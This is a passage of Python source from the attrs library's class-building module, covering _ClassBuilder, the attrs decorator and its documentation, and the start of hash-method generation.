__setattr__.\n        """\n        raise FrozenInstanceError()\n\n\ndef _frozen_delattrs(self, name):\n    """\n    Attached to frozen classes as __delattr__.\n    """\n    raise FrozenInstanceError()\n\n\nclass _ClassBuilder(object):\n    """\n    Iteratively build *one* class.\n    """\n\n    __slots__ = (\n        "_attr_names",\n        "_attrs",\n        "_base_attr_map",\n        "_base_names",\n        "_cache_hash",\n        "_cls",\n        "_cls_dict",\n        "_delete_attribs",\n        "_frozen",\n        "_has_pre_init",\n        "_has_post_init",\n        "_is_exc",\n        "_on_setattr",\n        "_slots",\n        "_weakref_slot",\n        "_wrote_own_setattr",\n        "_has_custom_setattr",\n    )\n\n    def __init__(\n        self,\n        cls,\n        these,\n        slots,\n        frozen,\n        weakref_slot,\n        getstate_setstate,\n        auto_attribs,\n        kw_only,\n        cache_hash,\n        is_exc,\n        collect_by_mro,\n        on_setattr,\n        has_custom_setattr,\n        field_transformer,\n    ):\n        attrs, base_attrs, base_map = _transform_attrs(\n            cls,\n            these,\n            auto_attribs,\n            kw_only,\n            collect_by_mro,\n            field_transformer,\n        )\n\n        self._cls = cls\n        self._cls_dict = dict(cls.__dict__) if slots else {}\n        self._attrs = attrs\n        self._base_names = set(a.name for a in base_attrs)\n        self._base_attr_map = base_map\n        self._attr_names = tuple(a.name for a in attrs)\n        self._slots = slots\n        self._frozen = frozen\n        self._weakref_slot = weakref_slot\n        self._cache_hash = cache_hash\n        self._has_pre_init = bool(getattr(cls, "__attrs_pre_init__", False))\n        self._has_post_init = bool(getattr(cls, "__attrs_post_init__", False))\n        self._delete_attribs = not bool(these)\n        self._is_exc = is_exc\n        self._on_setattr = on_setattr\n\n        self._has_custom_setattr = has_custom_setattr\n        self._wrote_own_setattr = False\n\n        self._cls_dict["__attrs_attrs__"] = self._attrs\n\n        if frozen:\n            self._cls_dict["__setattr__"] = _frozen_setattrs\n            self._cls_dict["__delattr__"] = _frozen_delattrs\n\n            self._wrote_own_setattr = True\n        elif on_setattr in (\n            _ng_default_on_setattr,\n            setters.validate,\n            setters.convert,\n        ):\n            has_validator = has_converter = False\n            for a in attrs:\n                if a.validator is not None:\n                    has_validator = True\n                if a.converter is not None:\n                    has_converter = True\n\n                if has_validator and has_converter:\n                    break\n            if (\n                (\n                    on_setattr == _ng_default_on_setattr\n                    and not (has_validator or has_converter)\n                )\n                or (on_setattr == setters.validate and not has_validator)\n                or (on_setattr == setters.convert and not has_converter)\n            ):\n                # If class-level on_setattr is set to convert + validate, but\n                # there\'s no field to convert or validate, pretend like there\'s\n                # no on_setattr.\n                self._on_setattr = None\n\n        if getstate_setstate:\n            (\n                self._cls_dict["__getstate__"],\n                self._cls_dict["__setstate__"],\n            ) = self._make_getstate_setstate()\n\n    def __repr__(self):\n        return "<_ClassBuilder(cls={cls})>".format(cls=self._cls.__name__)\n\n    def build_class(self):\n        """\n        Finalize class based on the accumulated configuration.\n\n        Builder cannot be used after calling this method.\n        """\n        if self._slots is True:\n            return self._create_slots_class()\n        else:\n            return self._patch_original_class()\n\n    def _patch_original_class(self):\n        """\n        Apply accumulated methods and return the class.\n        """\n        cls = self._cls\n        base_names = self._base_names\n\n        # Clean class of attribute definitions (`attr.ib()`s).\n        if self._delete_attribs:\n            for name in self._attr_names:\n                if (\n                    name not in base_names\n                    and getattr(cls, name, _sentinel) is not _sentinel\n                ):\n                    try:\n                        delattr(cls, name)\n                    except AttributeError:\n                        # This can happen if a base class defines a class\n                        # variable and we want to set an attribute with the\n                        # same name by using only a type annotation.\n                        pass\n\n        # Attach our dunder methods.\n        for name, value in self._cls_dict.items():\n            setattr(cls, name, value)\n\n        # If we\'ve inherited an attrs __setattr__ and don\'t write our own,\n        # reset it to object\'s.\n        if not self._wrote_own_setattr and getattr(\n            cls, "__attrs_own_setattr__", False\n        ):\n            cls.__attrs_own_setattr__ = False\n\n            if not self._has_custom_setattr:\n                cls.__setattr__ = object.__setattr__\n\n        return cls\n\n    def _create_slots_class(self):\n        """\n        Build and return a new class with a `__slots__` attribute.\n        """\n        cd = {\n            k: v\n            for k, v in iteritems(self._cls_dict)\n            if k not in tuple(self._attr_names) + ("__dict__", "__weakref__")\n        }\n\n        # If our class doesn\'t have its own implementation of __setattr__\n        # (either from the user or by us), check the bases, if one of them has\n        # an attrs-made __setattr__, that needs to be reset. We don\'t walk the\n        # MRO because we only care about our immediate base classes.\n        # XXX: This can be confused by subclassing a slotted attrs class with\n        # XXX: a non-attrs class and subclass the resulting class with an attrs\n        # XXX: class.  See `test_slotted_confused` for details.  For now that\'s\n        # XXX: OK with us.\n        if not self._wrote_own_setattr:\n            cd["__attrs_own_setattr__"] = False\n\n            if not self._has_custom_setattr:\n                for base_cls in self._cls.__bases__:\n                    if base_cls.__dict__.get("__attrs_own_setattr__", False):\n                        cd["__setattr__"] = object.__setattr__\n                        break\n\n        # Traverse the MRO to collect existing slots\n        # and check for an existing __weakref__.\n        existing_slots = dict()\n        weakref_inherited = False\n        for base_cls in self._cls.__mro__[1:-1]:\n            if base_cls.__dict__.get("__weakref__", None) is not None:\n                weakref_inherited = True\n            existing_slots.update(\n                {\n                    name: getattr(base_cls, name)\n                    for name in getattr(base_cls, "__slots__", [])\n                }\n            )\n\n        base_names = set(self._base_names)\n\n        names = self._attr_names\n        if (\n            self._weakref_slot\n            and "__weakref__" not in getattr(self._cls, "__slots__", ())\n            and "__weakref__" not in names\n            and not weakref_inherited\n        ):\n            names += ("__weakref__",)\n\n        # We only add the names of attributes that aren\'t inherited.\n        # Setting __slots__ to inherited attributes wastes memory.\n        slot_names = [name for name in names if name not in base_names]\n        # There are slots for attributes from current class\n        # that are defined in parent classes.\n        # As their descriptors may be overriden by a child class,\n        # we collect them here and update the class dict\n        reused_slots = {\n            slot: slot_descriptor\n            for slot, slot_descriptor in iteritems(existing_slots)\n            if slot in slot_names\n        }\n        slot_names = [name for name in slot_names if name not in reused_slots]\n        cd.update(reused_slots)\n        if self._cache_hash:\n            slot_names.append(_hash_cache_field)\n        cd["__slots__"] = tuple(slot_names)\n\n        qualname = getattr(self._cls, "__qualname__", None)\n        if qualname is not None:\n            cd["__qualname__"] = qualname\n\n        # Create new class based on old class and our methods.\n        cls = type(self._cls)(self._cls.__name__, self._cls.__bases__, cd)\n\n        # The following is a fix for\n        # <https://github.com/python-attrs/attrs/issues/102>.  On Python 3,\n        # if a method mentions `__class__` or uses the no-arg super(), the\n        # compiler will bake a reference to the class in the method itself\n        # as `method.__closure__`.  Since we replace the class with a\n        # clone, we rewrite these references so it keeps working.\n        for item in cls.__dict__.values():\n            if isinstance(item, (classmethod, staticmethod)):\n                # Class- and staticmethods hide their functions inside.\n                # These might need to be rewritten as well.\n                closure_cells = getattr(item.__func__, "__closure__", None)\n            elif isinstance(item, property):\n                # Workaround for property `super()` shortcut (PY3-only).\n                # There is no universal way for other descriptors.\n                closure_cells = getattr(item.fget, "__closure__", None)\n            else:\n                closure_cells = getattr(item, "__closure__", None)\n\n            if not closure_cells:  # Catch None or the empty list.\n                continue\n            for cell in closure_cells:\n                try:\n                    match = cell.cell_contents is self._cls\n                except ValueError:  # ValueError: Cell is empty\n                    pass\n                else:\n                    if match:\n                        set_closure_cell(cell, cls)\n\n        return cls\n\n    def add_repr(self, ns):\n        self._cls_dict["__repr__"] = self._add_method_dunders(\n            _make_repr(self._attrs, ns, self._cls)\n        )\n        return self\n\n    def add_str(self):\n        repr = self._cls_dict.get("__repr__")\n        if repr is None:\n            raise ValueError(\n                "__str__ can only be generated if a __repr__ exists."\n            )\n\n        def __str__(self):\n            return self.__repr__()\n\n        self._cls_dict["__str__"] = self._add_method_dunders(__str__)\n        return self\n\n    def _make_getstate_setstate(self):\n        """\n        Create custom __setstate__ and __getstate__ methods.\n        """\n        # __weakref__ is not writable.\n        state_attr_names = tuple(\n            an for an in self._attr_names if an != "__weakref__"\n        )\n\n        def slots_getstate(self):\n            """\n            Automatically created by attrs.\n            """\n            return tuple(getattr(self, name) for name in state_attr_names)\n\n        hash_caching_enabled = self._cache_hash\n\n        def slots_setstate(self, state):\n            """\n            Automatically created by attrs.\n            """\n            __bound_setattr = _obj_setattr.__get__(self, Attribute)\n            for name, value in zip(state_attr_names, state):\n                __bound_setattr(name, value)\n\n            # The hash code cache is not included when the object is\n            # serialized, but it still needs to be initialized to None to\n            # indicate that the first call to __hash__ should be a cache\n            # miss.\n            if hash_caching_enabled:\n                __bound_setattr(_hash_cache_field, None)\n\n        return slots_getstate, slots_setstate\n\n    def make_unhashable(self):\n        self._cls_dict["__hash__"] = None\n        return self\n\n    def add_hash(self):\n        self._cls_dict["__hash__"] = self._add_method_dunders(\n            _make_hash(\n                self._cls,\n                self._attrs,\n                frozen=self._frozen,\n                cache_hash=self._cache_hash,\n            )\n        )\n\n        return self\n\n    def add_init(self):\n        self._cls_dict["__init__"] = self._add_method_dunders(\n            _make_init(\n                self._cls,\n                self._attrs,\n                self._has_pre_init,\n                self._has_post_init,\n                self._frozen,\n                self._slots,\n                self._cache_hash,\n                self._base_attr_map,\n                self._is_exc,\n                self._on_setattr,\n                attrs_init=False,\n            )\n        )\n\n        return self\n\n    def add_match_args(self):\n        self._cls_dict["__match_args__"] = tuple(\n            field.name\n            for field in self._attrs\n            if field.init and not field.kw_only\n        )\n\n    def add_attrs_init(self):\n        self._cls_dict["__attrs_init__"] = self._add_method_dunders(\n            _make_init(\n                self._cls,\n                self._attrs,\n                self._has_pre_init,\n                self._has_post_init,\n                self._frozen,\n                self._slots,\n                self._cache_hash,\n                self._base_attr_map,\n                self._is_exc,\n                self._on_setattr,\n                attrs_init=True,\n            )\n        )\n\n        return self\n\n    def add_eq(self):\n        cd = self._cls_dict\n\n        cd["__eq__"] = self._add_method_dunders(\n            _make_eq(self._cls, self._attrs)\n        )\n        cd["__ne__"] = self._add_method_dunders(_make_ne())\n\n        return self\n\n    def add_order(self):\n        cd = self._cls_dict\n\n        cd["__lt__"], cd["__le__"], cd["__gt__"], cd["__ge__"] = (\n            self._add_method_dunders(meth)\n            for meth in _make_order(self._cls, self._attrs)\n        )\n\n        return self\n\n    def add_setattr(self):\n        if self._frozen:\n            return self\n\n        sa_attrs = {}\n        for a in self._attrs:\n            on_setattr = a.on_setattr or self._on_setattr\n            if on_setattr and on_setattr is not setters.NO_OP:\n                sa_attrs[a.name] = a, on_setattr\n\n        if not sa_attrs:\n            return self\n\n        if self._has_custom_setattr:\n            # We need to write a __setattr__ but there already is one!\n            raise ValueError(\n                "Can\'t combine custom __setattr__ with on_setattr hooks."\n            )\n\n        # docstring comes from _add_method_dunders\n        def __setattr__(self, name, val):\n            try:\n                a, hook = sa_attrs[name]\n            except KeyError:\n                nval = val\n            else:\n                nval = hook(self, a, val)\n\n            _obj_setattr(self, name, nval)\n\n        self._cls_dict["__attrs_own_setattr__"] = True\n        self._cls_dict["__setattr__"] = self._add_method_dunders(__setattr__)\n        self._wrote_own_setattr = True\n\n        return self\n\n    def _add_method_dunders(self, method):\n        """\n        Add __module__ and __qualname__ to a *method* if possible.\n        """\n        try:\n            method.__module__ = self._cls.__module__\n        except AttributeError:\n            pass\n\n        try:\n            method.__qualname__ = ".".join(\n                (self._cls.__qualname__, method.__name__)\n            )\n        except AttributeError:\n            pass\n\n        try:\n            method.__doc__ = "Method generated by attrs for class %s." % (\n                self._cls.__qualname__,\n            )\n        except AttributeError:\n            pass\n\n        return method\n\n\n_CMP_DEPRECATION = (\n    "The usage of `cmp` is deprecated and will be removed on or after "\n    "2021-06-01.  Please use `eq` and `order` instead."\n)\n\n\ndef _determine_attrs_eq_order(cmp, eq, order, default_eq):\n    """\n    Validate the combination of *cmp*, *eq*, and *order*. Derive the effective\n    values of eq and order.  If *eq* is None, set it to *default_eq*.\n    """\n    if cmp is not None and any((eq is not None, order is not None)):\n        raise ValueError("Don\'t mix `cmp` with `eq\' and `order`.")\n\n    # cmp takes precedence due to bw-compatibility.\n    if cmp is not None:\n        return cmp, cmp\n\n    # If left None, equality is set to the specified default and ordering\n    # mirrors equality.\n    if eq is None:\n        eq = default_eq\n\n    if order is None:\n        order = eq\n\n    if eq is False and order is True:\n        raise ValueError("`order` can only be True if `eq` is True too.")\n\n    return eq, order\n\n\ndef _determine_attrib_eq_order(cmp, eq, order, default_eq):\n    """\n    Validate the combination of *cmp*, *eq*, and *order*. Derive the effective\n    values of eq and order.  If *eq* is None, set it to *default_eq*.\n    """\n    if cmp is not None and any((eq is not None, order is not None)):\n        raise ValueError("Don\'t mix `cmp` with `eq\' and `order`.")\n\n    def decide_callable_or_boolean(value):\n        """\n        Decide whether a key function is used.\n        """\n        if callable(value):\n            value, key = True, value\n        else:\n            key = None\n        return value, key\n\n    # cmp takes precedence due to bw-compatibility.\n    if cmp is not None:\n        cmp, cmp_key = decide_callable_or_boolean(cmp)\n        return cmp, cmp_key, cmp, cmp_key\n\n    # If left None, equality is set to the specified default and ordering\n    # mirrors equality.\n    if eq is None:\n        eq, eq_key = default_eq, None\n    else:\n        eq, eq_key = decide_callable_or_boolean(eq)\n\n    if order is None:\n        order, order_key = eq, eq_key\n    else:\n        order, order_key = decide_callable_or_boolean(order)\n\n    if eq is False and order is True:\n        raise ValueError("`order` can only be True if `eq` is True too.")\n\n    return eq, eq_key, order, order_key\n\n\ndef _determine_whether_to_implement(\n    cls, flag, auto_detect, dunders, default=True\n):\n    """\n    Check whether we should implement a set of methods for *cls*.\n\n    *flag* is the argument passed into @attr.s like \'init\', *auto_detect* the\n    same as passed into @attr.s and *dunders* is a tuple of attribute names\n    whose presence signal that the user has implemented it themselves.\n\n    Return *default* if no reason for either for or against is found.\n\n    auto_detect must be False on Python 2.\n    """\n    if flag is True or flag is False:\n        return flag\n\n    if flag is None and auto_detect is False:\n        return default\n\n    # Logically, flag is None and auto_detect is True here.\n    for dunder in dunders:\n        if _has_own_attribute(cls, dunder):\n            return False\n\n    return default\n\n\ndef attrs(\n    maybe_cls=None,\n    these=None,\n    repr_ns=None,\n    repr=None,\n    cmp=None,\n    hash=None,\n    init=None,\n    slots=False,\n    frozen=False,\n    weakref_slot=True,\n    str=False,\n    auto_attribs=False,\n    kw_only=False,\n    cache_hash=False,\n    auto_exc=False,\n    eq=None,\n    order=None,\n    auto_detect=False,\n    collect_by_mro=False,\n    getstate_setstate=None,\n    on_setattr=None,\n    field_transformer=None,\n    match_args=True,\n):\n    r"""\n    A class decorator that adds `dunder\n    <https://wiki.python.org/moin/DunderAlias>`_\\ -methods according to the\n    specified attributes using `attr.ib` or the *these* argument.\n\n    :param these: A dictionary of name to `attr.ib` mappings.  This is\n        useful to avoid the definition of your attributes within the class body\n        because you can\'t (e.g. if you want to add ``__repr__`` methods to\n        Django models) or don\'t want to.\n\n        If *these* is not ``None``, ``attrs`` will *not* search the class body\n        for attributes and will *not* remove any attributes from it.\n\n        If *these* is an ordered dict (`dict` on Python 3.6+,\n        `collections.OrderedDict` otherwise), the order is deduced from\n        the order of the attributes inside *these*.  Otherwise the order\n        of the definition of the attributes is used.\n\n    :type these: `dict` of `str` to `attr.ib`\n\n    :param str repr_ns: When using nested classes, there\'s no way in Python 2\n        to automatically detect that.  Therefore it\'s possible to set the\n        namespace explicitly for a more meaningful ``repr`` output.\n    :param bool auto_detect: Instead of setting the *init*, *repr*, *eq*,\n        *order*, and *hash* arguments explicitly, assume they are set to\n        ``True`` **unless any** of the involved methods for one of the\n        arguments is implemented in the *current* class (i.e. it is *not*\n        inherited from some base class).\n\n        So for example by implementing ``__eq__`` on a class yourself,\n        ``attrs`` will deduce ``eq=False`` and will create *neither*\n        ``__eq__`` *nor* ``__ne__`` (but Python classes come with a sensible\n        ``__ne__`` by default, so it *should* be enough to only implement\n        ``__eq__`` in most cases).\n\n        .. warning::\n\n           If you prevent ``attrs`` from creating the ordering methods for you\n           (``order=False``, e.g. by implementing ``__le__``), it becomes\n           *your* responsibility to make sure its ordering is sound. The best\n           way is to use the `functools.total_ordering` decorator.\n\n\n        Passing ``True`` or ``False`` to *init*, *repr*, *eq*, *order*,\n        *cmp*, or *hash* overrides whatever *auto_detect* would determine.\n\n        *auto_detect* requires Python 3. Setting it ``True`` on Python 2 raises\n        an `attrs.exceptions.PythonTooOldError`.\n\n    :param bool repr: Create a ``__repr__`` method with a human readable\n        representation of ``attrs`` attributes..\n    :param bool str: Create a ``__str__`` method that is identical to\n        ``__repr__``.  This is usually not necessary except for\n        `Exception`\\ s.\n    :param Optional[bool] eq: If ``True`` or ``None`` (default), add ``__eq__``\n        and ``__ne__`` methods that check two instances for equality.\n\n        They compare the instances as if they were tuples of their ``attrs``\n        attributes if and only if the types of both classes are *identical*!\n    :param Optional[bool] order: If ``True``, add ``__lt__``, ``__le__``,\n        ``__gt__``, and ``__ge__`` methods that behave like *eq* above and\n        allow instances to be ordered. If ``None`` (default) mirror value of\n        *eq*.\n    :param Optional[bool] cmp: Setting *cmp* is equivalent to setting *eq*\n        and *order* to the same value. Must not be mixed with *eq* or *order*.\n    :param Optional[bool] hash: If ``None`` (default), the ``__hash__`` method\n        is generated according how *eq* and *frozen* are set.\n\n        1. If *both* are True, ``attrs`` will generate a ``__hash__`` for you.\n        2. If *eq* is True and *frozen* is False, ``__hash__`` will be set to\n           None, marking it unhashable (which it is).\n        3. If *eq* is False, ``__hash__`` will be left untouched meaning the\n           ``__hash__`` method of the base class will be used (if base class is\n           ``object``, this means it will fall back to id-based hashing.).\n\n        Although not recommended, you can decide for yourself and force\n        ``attrs`` to create one (e.g. if the class is immutable even though you\n        didn\'t freeze it programmatically) by passing ``True`` or not.  Both of\n        these cases are rather special and should be used carefully.\n\n        See our documentation on `hashing`, Python\'s documentation on\n        `object.__hash__`, and the `GitHub issue that led to the default \\\n        behavior <https://github.com/python-attrs/attrs/issues/136>`_ for more\n        details.\n    :param bool init: Create a ``__init__`` method that initializes the\n        ``attrs`` attributes. Leading underscores are stripped for the argument\n        name. If a ``__attrs_pre_init__`` method exists on the class, it will\n        be called before the class is initialized. If a ``__attrs_post_init__``\n        method exists on the class, it will be called after the class is fully\n        initialized.\n\n        If ``init`` is ``False``, an ``__attrs_init__`` method will be\n        injected instead. This allows you to define a custom ``__init__``\n        method that can do pre-init work such as ``super().__init__()``,\n        and then call ``__attrs_init__()`` and ``__attrs_post_init__()``.\n    :param bool slots: Create a `slotted class <slotted classes>` that\'s more\n        memory-efficient. Slotted classes are generally superior to the default\n        dict classes, but have some gotchas you should know about, so we\n        encourage you to read the `glossary entry <slotted classes>`.\n    :param bool frozen: Make instances immutable after initialization.  If\n        someone attempts to modify a frozen instance,\n        `attr.exceptions.FrozenInstanceError` is raised.\n\n        .. note::\n\n            1. This is achieved by installing a custom ``__setattr__`` method\n               on your class, so you can\'t implement your own.\n\n            2. True immutability is impossible in Python.\n\n            3. This *does* have a minor a runtime performance `impact\n               <how-frozen>` when initializing new instances.  In other words:\n               ``__init__`` is slightly slower with ``frozen=True``.\n\n            4. If a class is frozen, you cannot modify ``self`` in\n               ``__attrs_post_init__`` or a self-written ``__init__``. You can\n               circumvent that limitation by using\n               ``object.__setattr__(self, "attribute_name", value)``.\n\n            5. Subclasses of a frozen class are frozen too.\n\n    :param bool weakref_slot: Make instances weak-referenceable.  This has no\n        effect unless ``slots`` is also enabled.\n    :param bool auto_attribs: If ``True``, collect `PEP 526`_-annotated\n        attributes (Python 3.6 and later only) from the class body.\n\n        In this case, you **must** annotate every field.  If ``attrs``\n        encounters a field that is set to an `attr.ib` but lacks a type\n        annotation, an `attr.exceptions.UnannotatedAttributeError` is\n        raised.  Use ``field_name: typing.Any = attr.ib(...)`` if you don\'t\n        want to set a type.\n\n        If you assign a value to those attributes (e.g. ``x: int = 42``), that\n        value becomes the default value like if it were passed using\n        ``attr.ib(default=42)``.  Passing an instance of `attrs.Factory` also\n        works as expected in most cases (see warning below).\n\n        Attributes annotated as `typing.ClassVar`, and attributes that are\n        neither annotated nor set to an `attr.ib` are **ignored**.\n\n        .. warning::\n           For features that use the attribute name to create decorators (e.g.\n           `validators <validators>`), you still *must* assign `attr.ib` to\n           them. Otherwise Python will either not find the name or try to use\n           the default value to call e.g. ``validator`` on it.\n\n           These errors can be quite confusing and probably the most common bug\n           report on our bug tracker.\n\n        .. _`PEP 526`: https://www.python.org/dev/peps/pep-0526/\n    :param bool kw_only: Make all attributes keyword-only (Python 3+)\n        in the generated ``__init__`` (if ``init`` is ``False``, this\n        parameter is ignored).\n    :param bool cache_hash: Ensure that the object\'s hash code is computed\n        only once and stored on the object.  If this is set to ``True``,\n        hashing must be either explicitly or implicitly enabled for this\n        class.  If the hash code is cached, avoid any reassignments of\n        fields involved in hash code computation or mutations of the objects\n        those fields point to after object creation.  If such changes occur,\n        the behavior of the object\'s hash code is undefined.\n    :param bool auto_exc: If the class subclasses `BaseException`\n        (which implicitly includes any subclass of any exception), the\n        following happens to behave like a well-behaved Python exceptions\n        class:\n\n        - the values for *eq*, *order*, and *hash* are ignored and the\n          instances compare and hash by the instance\'s ids (N.B. ``attrs`` will\n          *not* remove existing implementations of ``__hash__`` or the equality\n          methods. It just won\'t add own ones.),\n        - all attributes that are either passed into ``__init__`` or have a\n          default value are additionally available as a tuple in the ``args``\n          attribute,\n        - the value of *str* is ignored leaving ``__str__`` to base classes.\n    :param bool collect_by_mro: Setting this to `True` fixes the way ``attrs``\n       collects attributes from base classes.  The default behavior is\n       incorrect in certain cases of multiple inheritance.  It should be on by\n       default but is kept off for backward-compatibility.\n\n       See issue `#428 <https://github.com/python-attrs/attrs/issues/428>`_ for\n       more details.\n\n    :param Optional[bool] getstate_setstate:\n       .. note::\n          This is usually only interesting for slotted classes and you should\n          probably just set *auto_detect* to `True`.\n\n       If `True`, ``__getstate__`` and\n       ``__setstate__`` are generated and attached to the class. This is\n       necessary for slotted classes to be pickleable. If left `None`, it\'s\n       `True` by default for slotted classes and ``False`` for dict classes.\n\n       If *auto_detect* is `True`, and *getstate_setstate* is left `None`,\n       and **either** ``__getstate__`` or ``__setstate__`` is detected directly\n       on the class (i.e. not inherited), it is set to `False` (this is usually\n       what you want).\n\n    :param on_setattr: A callable that is run whenever the user attempts to set\n        an attribute (either by assignment like ``i.x = 42`` or by using\n        `setattr` like ``setattr(i, "x", 42)``). It receives the same arguments\n        as validators: the instance, the attribute that is being modified, and\n        the new value.\n\n        If no exception is raised, the attribute is set to the return value of\n        the callable.\n\n        If a list of callables is passed, they\'re automatically wrapped in an\n        `attrs.setters.pipe`.\n\n    :param Optional[callable] field_transformer:\n        A function that is called with the original class object and all\n        fields right before ``attrs`` finalizes the class.  You can use\n        this, e.g., to automatically add converters or validators to\n        fields based on their types.  See `transform-fields` for more details.\n\n    :param bool match_args:\n        If `True` (default), set ``__match_args__`` on the class to support\n        `PEP 634 <https://www.python.org/dev/peps/pep-0634/>`_ (Structural\n        Pattern Matching). It is a tuple of all positional-only ``__init__``\n        parameter names on Python 3.10 and later. Ignored on older Python\n        versions.\n\n    .. versionadded:: 16.0.0 *slots*\n    .. versionadded:: 16.1.0 *frozen*\n    .. versionadded:: 16.3.0 *str*\n    .. versionadded:: 16.3.0 Support for ``__attrs_post_init__``.\n    .. versionchanged:: 17.1.0\n       *hash* supports ``None`` as value which is also the default now.\n    .. versionadded:: 17.3.0 *auto_attribs*\n    .. versionchanged:: 18.1.0\n       If *these* is passed, no attributes are deleted from the class body.\n    .. versionchanged:: 18.1.0 If *these* is ordered, the order is retained.\n    .. versionadded:: 18.2.0 *weakref_slot*\n    .. deprecated:: 18.2.0\n       ``__lt__``, ``__le__``, ``__gt__``, and ``__ge__`` now raise a\n       `DeprecationWarning` if the classes compared are subclasses of\n       each other. ``__eq`` and ``__ne__`` never tried to compared subclasses\n       to each other.\n    .. versionchanged:: 19.2.0\n       ``__lt__``, ``__le__``, ``__gt__``, and ``__ge__`` now do not consider\n       subclasses comparable anymore.\n    .. versionadded:: 18.2.0 *kw_only*\n    .. versionadded:: 18.2.0 *cache_hash*\n    .. versionadded:: 19.1.0 *auto_exc*\n    .. deprecated:: 19.2.0 *cmp* Removal on or after 2021-06-01.\n    .. versionadded:: 19.2.0 *eq* and *order*\n    .. versionadded:: 20.1.0 *auto_detect*\n    .. versionadded:: 20.1.0 *collect_by_mro*\n    .. versionadded:: 20.1.0 *getstate_setstate*\n    .. versionadded:: 20.1.0 *on_setattr*\n    .. versionadded:: 20.3.0 *field_transformer*\n    .. versionchanged:: 21.1.0\n       ``init=False`` injects ``__attrs_init__``\n    .. versionchanged:: 21.1.0 Support for ``__attrs_pre_init__``\n    .. versionchanged:: 21.1.0 *cmp* undeprecated\n    .. versionadded:: 21.3.0 *match_args*\n    """\n    if auto_detect and PY2:\n        raise PythonTooOldError(\n            "auto_detect only works on Python 3 and later."\n        )\n\n    eq_, order_ = _determine_attrs_eq_order(cmp, eq, order, None)\n    hash_ = hash  # work around the lack of nonlocal\n\n    if isinstance(on_setattr, (list, tuple)):\n        on_setattr = setters.pipe(*on_setattr)\n\n    def wrap(cls):\n\n        if getattr(cls, "__class__", None) is None:\n            raise TypeError("attrs only works with new-style classes.")\n\n        is_frozen = frozen or _has_frozen_base_class(cls)\n        is_exc = auto_exc is True and issubclass(cls, BaseException)\n        has_own_setattr = auto_detect and _has_own_attribute(\n            cls, "__setattr__"\n        )\n\n        if has_own_setattr and is_frozen:\n            raise ValueError("Can\'t freeze a class with a custom __setattr__.")\n\n        builder = _ClassBuilder(\n            cls,\n            these,\n            slots,\n            is_frozen,\n            weakref_slot,\n            _determine_whether_to_implement(\n                cls,\n                getstate_setstate,\n                auto_detect,\n                ("__getstate__", "__setstate__"),\n                default=slots,\n            ),\n            auto_attribs,\n            kw_only,\n            cache_hash,\n            is_exc,\n            collect_by_mro,\n            on_setattr,\n            has_own_setattr,\n            field_transformer,\n        )\n        if _determine_whether_to_implement(\n            cls, repr, auto_detect, ("__repr__",)\n        ):\n            builder.add_repr(repr_ns)\n        if str is True:\n            builder.add_str()\n\n        eq = _determine_whether_to_implement(\n            cls, eq_, auto_detect, ("__eq__", "__ne__")\n        )\n        if not is_exc and eq is True:\n            builder.add_eq()\n        if not is_exc and _determine_whether_to_implement(\n            cls, order_, auto_detect, ("__lt__", "__le__", "__gt__", "__ge__")\n        ):\n            builder.add_order()\n\n        builder.add_setattr()\n\n        if (\n            hash_ is None\n            and auto_detect is True\n            and _has_own_attribute(cls, "__hash__")\n        ):\n            hash = False\n        else:\n            hash = hash_\n        if hash is not True and hash is not False and hash is not None:\n            # Can\'t use `hash in` because 1 == True for example.\n            raise TypeError(\n                "Invalid value for hash.  Must be True, False, or None."\n            )\n        elif hash is False or (hash is None and eq is False) or is_exc:\n            # Don\'t do anything. Should fall back to __object__\'s __hash__\n            # which is by id.\n            if cache_hash:\n                raise TypeError(\n                    "Invalid value for cache_hash.  To use hash caching,"\n                    " hashing must be either explicitly or implicitly "\n                    "enabled."\n                )\n        elif hash is True or (\n            hash is None and eq is True and is_frozen is True\n        ):\n            # Build a __hash__ if told so, or if it\'s safe.\n            builder.add_hash()\n        else:\n            # Raise TypeError on attempts to hash.\n            if cache_hash:\n                raise TypeError(\n                    "Invalid value for cache_hash.  To use hash caching,"\n                    " hashing must be either explicitly or implicitly "\n                    "enabled."\n                )\n            builder.make_unhashable()\n\n        if _determine_whether_to_implement(\n            cls, init, auto_detect, ("__init__",)\n        ):\n            builder.add_init()\n        else:\n            builder.add_attrs_init()\n            if cache_hash:\n                raise TypeError(\n                    "Invalid value for cache_hash.  To use hash caching,"\n                    " init must be True."\n                )\n\n        if (\n            PY310\n            and match_args\n            and not _has_own_attribute(cls, "__match_args__")\n        ):\n            builder.add_match_args()\n\n        return builder.build_class()\n\n    # maybe_cls\'s type depends on the usage of the decorator.  It\'s a class\n    # if it\'s used as `@attrs` but ``None`` if used as `@attrs()`.\n    if maybe_cls is None:\n        return wrap\n    else:\n        return wrap(maybe_cls)\n\n\n_attrs = attrs\n"""\nInternal alias so we can use it in functions that take an argument called\n*attrs*.\n"""\n\n\nif PY2:\n\n    def _has_frozen_base_class(cls):\n        """\n        Check whether *cls* has a frozen ancestor by looking at its\n        __setattr__.\n        """\n        return (\n            getattr(cls.__setattr__, "__module__", None)\n            == _frozen_setattrs.__module__\n            and cls.__setattr__.__name__ == _frozen_setattrs.__name__\n        )\n\nelse:\n\n    def _has_frozen_base_class(cls):\n        """\n        Check whether *cls* has a frozen ancestor by looking at its\n        __setattr__.\n        """\n        return cls.__setattr__ == _frozen_setattrs\n\n\ndef _generate_unique_filename(cls, func_name):\n    """\n    Create a "filename" suitable for a function being generated.\n    """\n    unique_filename = "<attrs generated {0} {1}.{2}>".format(\n        func_name,\n        cls.__module__,\n        getattr(cls, "__qualname__", cls.__name__),\n    )\n    return unique_filename\n\n\ndef _make_hash(cls, attrs, frozen, cache_hash):\n    attrs = tuple(\n        a for a in attrs if a.hash is True or (a.hash is None and a.eq is True)\n    )\n\n    tab = "        "\n\n    unique_filename = _generate_unique_filename(cls, "hash")\n    type_hash = hash(unique_filename)\n\n    hash_def = "def __hash__(self"\n    hash_func = "hash(("\n    closing_braces = "))"\n    if not cache_hash:\n        hash_def += "):"\n    else:\n        if not PY2:\n            hash_def += ", *"\n\n        hash_def += (\n            ", _cache_wrapper="\n            + "__import__(\'attr._make\')._make._CacheHashWrapper):"\n        )\n        hash_func = "_cache_wrapper(" + hash_func\n        closing_braces += ")"\n\n    method_lines = [hash_def]\n\n    def append_hash_computation_lines(prefix, indent):\n        """\n        Generate the code for actually computing the hash code.\n        Below this will either be returned directly or used to compute\n        a value which is then cached, depending on the value of cache_hash\n        """\n\n        method_lines.extend(\n            [\n                indent + prefix + hash_func,\n                indent + "        %d," % (type_hash,),\n            ]\n        )\n\n        for a in attrs:\n            method_lines.append(indent + "        self.%s," % a.name)\n\n 